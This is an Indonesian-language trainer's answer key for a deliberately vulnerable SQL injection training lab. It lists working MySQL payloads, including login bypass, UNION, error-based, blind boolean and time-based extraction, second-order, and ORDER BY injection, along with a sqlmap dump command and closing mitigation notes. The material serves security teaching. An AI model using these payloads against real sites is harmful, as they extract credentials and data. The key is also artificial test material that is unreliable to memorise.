# Kunci Jawaban — SQL Injection Lab (VulnShop)

> 📌 **Untuk trainer/pendamping.** Dokumen ini berisi payload final, langkah lengkap, dan
> penjelasan *kenapa* tiap payload berhasil untuk ke-7 lab di [README.md](README.md). Jangan
> dibagikan ke peserta sebelum sesi lab selesai — tujuannya sebagai pegangan koreksi, bukan
> bahan lab itu sendiri.
>
> Target akhir yang harus didapat peserta di Lab 1–5: **password admin `S3cr3tAdminPass!`**
> (user `admin`, role `admin`, lihat `db/init.sql`).

---

## Lab 1 — Authentication Bypass (`lab1_login_bypass.php`)

**Query di server:**
```sql
SELECT * FROM users WHERE username = '$user' AND password = '$pass'
```
`$username`/`$password` dari POST langsung disisipkan ke dalam string literal tanpa escaping
maupun prepared statement.

**Langkah:**
1. Buka form login, isi:
   - Username: `admin'-- -`
   - Password: bebas (mis. `x`)
2. Query yang benar-benar dieksekusi (halaman ini meng-echo query-nya, jadi bisa dicek langsung):
   ```sql
   SELECT * FROM users WHERE username = 'admin'-- -' AND password = 'x'
   ```
   `-- -` mengomentari sisa query, sehingga klausa `AND password = '...'` tidak pernah dievaluasi
   — query efektif menjadi `SELECT * FROM users WHERE username = 'admin'`.
3. Hasil: `Login successful! Welcome, admin (role: admin)`.

**Payload alternatif** (tanpa perlu tahu username `admin` sebelumnya):
- Username: `' OR '1'='1' -- -`, password bebas → mengembalikan baris pertama tabel `users`
  (`admin`, karena `id=1`).

---

## Lab 2 — UNION-based (`lab2_union.php`)

**Query di server:**
```sql
SELECT id, name, description, price FROM products WHERE id = $id
```
`$id` dari GET, **tanpa tanda kutip dan tanpa cast ke integer** — sehingga bisa langsung
disambung dengan klausa SQL lain tanpa perlu keluar dari string literal dulu.

**Langkah:**
1. **Cari jumlah kolom.** Karena tabel `products` yang dipakai punya 4 kolom hasil SELECT
   (`id, name, description, price`), payload berikut langsung cocok — tapi ajarkan peserta
   proses trial-and-error-nya:
   ```
   ?id=0 UNION SELECT 1,2,3,4-- -
   ```
   Kalau jumlah kolom salah, MySQL akan menampilkan error
   `The used SELECT statements have a different number of columns` di `error-box` halaman ini.
2. **Cek kolom mana yang bisa menampung string** (semua kolom hasil `products` bisa, tapi
   biasakan peserta memverifikasi):
   ```
   ?id=0 UNION SELECT 1,'a','b',4-- -
   ```
   Tabel hasil akan menampilkan baris tambahan dengan `Name = a`, `Description = b`.
3. **Ambil data tabel `users`:**
   ```
   ?id=0 UNION SELECT id, username, password, role FROM users-- -
   ```
4. Hasil (3 baris tambahan muncul di tabel produk, kolom "Name"/"Description"/"Price"
   sebenarnya menampilkan `username`/`password`/`role`):

   | ID | Name (=username) | Description (=password) | Price (=role) |
   |---|---|---|---|
   | 1 | admin | S3cr3tAdminPass! | admin |
   | 2 | alice | alice123 | user |
   | 3 | bob | bobpass99 | user |

---

## Lab 3 — Error-based (`lab3_error_based.php`)

**Query di server:**
```sql
SELECT id, name, price FROM products WHERE category = '$category'
```
Halaman ini **tidak** meng-echo query, tapi menampilkan pesan error MySQL mentah — itulah
kanal kebocoran yang dieksploitasi.

**Langkah:**
1. Konfirmasi teknik jalan (ambil versi MySQL dulu):
   ```
   ?category=electronics' AND extractvalue(1,concat(0x7e,(SELECT version())))-- -
   ```
   `extractvalue()` mengharapkan argumen kedua berupa XPath valid; `concat(0x7e, ...)` membuat
   XPath tidak valid dengan sengaja, sehingga MySQL melempar error yang **menyertakan isi
   subquery** di dalam pesannya, diawali karakter `~` (0x7e), contoh:
   `XPATH syntax error: '~8.0.xx'`.
2. Ambil password admin:
   ```
   ?category=electronics' AND extractvalue(1,concat(0x7e,(SELECT password FROM users WHERE username='admin')))-- -
   ```
   Pesan error yang tampil: `XPATH syntax error: '~S3cr3tAdminPass!'`.

   > Catatan: `extractvalue()` hanya menampilkan maksimal 32 karakter pertama. Password admin di
   > lab ini (16 karakter) muat penuh, tapi untuk data lebih panjang jelaskan ke peserta perlu
   > `SUBSTRING()` bertahap, mis. `SUBSTRING((SELECT password ...),1,32)` lalu
   > `SUBSTRING(...,33,32)`, dst.

---

## Lab 4 — Blind Boolean-based (`lab4_blind_boolean.php`)

**Query di server:**
```sql
SELECT id FROM products WHERE id = $id AND price > 0
```
Tidak ada data maupun error yang ditampilkan — hanya dua kemungkinan pesan (oracle):
- **True** → `Product is IN STOCK.`
- **False** (termasuk kalau payload bikin query error) → `Product NOT FOUND or out of stock.`

**Langkah:**
1. Konfirmasi oracle jalan:
   ```
   ?id=1 AND 1=1   → Product is IN STOCK.
   ?id=1 AND 1=2   → Product NOT FOUND or out of stock.
   ```
2. Ekstrak password admin karakter per karakter dengan `SUBSTRING` + `BINARY` (perlu `BINARY`
   supaya perbandingan **case-sensitive**, karena password mengandung huruf besar/kecil dan
   collation default MySQL biasanya *case-insensitive*):
   ```
   ?id=1 AND BINARY SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='S'
   ```
   → `IN STOCK` (benar, karakter ke-1 = `S`). Ulangi untuk posisi 2, 3, dst., ganti karakter
   tebakan sampai dapat respons `IN STOCK`, lalu lanjut ke posisi berikutnya.
3. Hasil akhir setelah 16 iterasi (satu per posisi karakter): **`S3cr3tAdminPass!`**.

> Untuk mempercepat demo di kelas, boleh tunjukkan cara otomatisasi manual sederhana (loop
> `curl` di bash/Python mencoba tiap karakter ASCII printable) atau perkenalkan `sqlmap` sebagai
> alat produksi (`sqlmap -u ".../lab4_blind_boolean.php?id=1" --dbms=mysql --technique=B --dump`)
> setelah peserta memahami konsepnya secara manual dulu.

---

## Lab 5 — Blind Time-based (`lab5_blind_time.php`)

**Query di server:**
```sql
SELECT id FROM products WHERE id = $id
```
Respons **selalu** identik secara teks: `Request processed. (server time: {elapsed}s)` — satu-
satunya sinyal adalah nilai `{elapsed}` (waktu proses request dalam detik).

**Langkah:**
1. Baseline (tanpa delay): `?id=1` → server time ~0.0x detik.
2. Konfirmasi injeksi jalan: `?id=1 AND SLEEP(3)` → server time naik jadi ~3.0x detik.
3. Ekstrak password admin karakter per karakter (sama seperti Lab 4, tapi oracle-nya delay,
   bukan teks, dan tetap pakai `BINARY` untuk case-sensitivity):
   ```
   ?id=1 AND IF(BINARY SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='S',SLEEP(3),0)
   ```
   Kalau tebakan benar → respons lambat ~3 detik. Kalau salah → respons instan. Ulangi untuk
   tiap posisi sampai seluruh **`S3cr3tAdminPass!`** (16 karakter) terkumpul.

---

## Lab 6 — Second-order SQL Injection (`lab6_second_order.php`)

Ada **dua tahap query**, dan hanya tahap kedua yang rentan:

**Tahap 1 — Registrasi (AMAN, pakai prepared statement):**
```php
$stmt = $mysqli->prepare("INSERT INTO profiles (username, bio) VALUES (?, ?)");
$stmt->bind_param('ss', $username, $bio);
```
Nilai `username` disimpan **apa adanya** (verbatim) ke tabel `profiles` **dan** ke cookie
`profile_username` — payload SQLi lolos tersimpan dengan aman di tahap ini karena
prepared statement, tapi nilainya akan dipakai ulang secara tidak aman di tahap 2.

**Tahap 2 — Lihat Bio (RENTAN, concatenation langsung):**
```sql
SELECT bio FROM profiles WHERE username = '$stored_username' ORDER BY id DESC LIMIT 1
```
`$stored_username` diambil dari cookie `profile_username` (nilai yang sama yang disimpan di
tahap 1) lalu disambung langsung ke query tanpa escaping apa pun.

**Langkah:**
1. Register dengan:
   - Username: `x' UNION SELECT password FROM users WHERE username='admin'-- -`
   - Bio: bebas (mis. `test`)
2. Klik **"View My Bio"** (request `?action=view`). Query yang tereksekusi:
   ```sql
   SELECT bio FROM profiles WHERE username = 'x' UNION SELECT password FROM users WHERE username='admin'-- -' ORDER BY id DESC LIMIT 1
   ```
   Hanya butuh **1 kolom** di UNION karena `profiles` cuma men-SELECT kolom `bio`.
3. Hasil: `Bio: S3cr3tAdminPass!`

**Poin diskusi:** input yang "aman" saat pertama disimpan (karena prepared statement) tetap
bisa jadi berbahaya kalau dipakai ulang di query lain tanpa validasi ulang — payload tidak
harus langsung dieksekusi di titik input pertama.

---

## Lab 7 — SQLi pada `ORDER BY` (`lab7_order_by.php`)

**Query di server:**
```sql
SELECT id, name, price FROM products ORDER BY $sort
```
`$sort` **tidak di-whitelist sama sekali**. `UNION` tidak bisa dipakai langsung di posisi
`ORDER BY`, jadi teknik yang dipakai adalah **oracle boolean lewat urutan baris** (row order
sebagai sinyal true/false, bukan teks/error).

**Langkah:**
1. Konfirmasi oracle jalan — bandingkan urutan hasil dua request ini:
   ```
   ?sort=(CASE WHEN (1=1) THEN name ELSE price END)   → produk terurut ALFABET berdasarkan nama
   ?sort=(CASE WHEN (1=2) THEN name ELSE price END)   → produk terurut NUMERIK berdasarkan harga
   ```
   Urutan baris yang berbeda di antara dua respons ini adalah oracle true/false.
2. Ekstrak password admin karakter per karakter dengan oracle yang sama:
   ```
   ?sort=(CASE WHEN (BINARY SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='S') THEN name ELSE price END)
   ```
   Kalau kondisi **true**: urutan mengikuti nama produk (alfabet). Kalau **false**: urutan
   mengikuti harga (numerik). Bandingkan urutan `id` yang muncul untuk menyimpulkan true/false,
   lalu ulangi untuk tiap posisi karakter sampai dapat **`S3cr3tAdminPass!`**.

> **Materi lanjutan (opsional):** teknik error-based ganda di MySQL lewat `GROUP BY` +
> `RAND()` duplicate-key trick, mis.
> `?sort=(SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT password FROM users WHERE username='admin'),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)`
> — akan memicu error `Duplicate entry '...'` yang isinya mengandung password admin. Cocok
> untuk peserta tingkat lanjut yang sudah selesai lebih cepat.

---

## Ringkasan hasil akhir

| Lab | Teknik | Hasil yang harus didapat |
|---|---|---|
| 1 | Auth bypass | Login sebagai `admin` tanpa tahu password |
| 2 | UNION-based | `admin / S3cr3tAdminPass! / admin` (+ alice, bob) lewat tabel produk |
| 3 | Error-based | `S3cr3tAdminPass!` muncul di pesan error MySQL |
| 4 | Blind boolean | `S3cr3tAdminPass!` diekstrak karakter per karakter dari oracle IN STOCK/NOT FOUND |
| 5 | Blind time-based | `S3cr3tAdminPass!` diekstrak dari selisih waktu respons (`SLEEP`) |
| 6 | Second-order | `S3cr3tAdminPass!` muncul di "Bio" lewat username yang di-UNION |
| 7 | ORDER BY | Password admin diekstrak lewat perubahan urutan baris (`CASE WHEN`) |

## Mitigasi (ringkas, lihat [README.md](README.md) untuk versi lengkap)
- Prepared statements/parameterized queries di semua lab (termasuk Lab 6 tahap kedua).
- Whitelist nama kolom/arah sort untuk Lab 7, jangan pernah concatenate input ke `ORDER BY`.
- Least privilege akun DB, disable raw SQL error ke user (Lab 3), dan validasi ulang data setiap
  kali dipakai di query baru (Lab 6) — bukan cuma saat pertama disimpan.
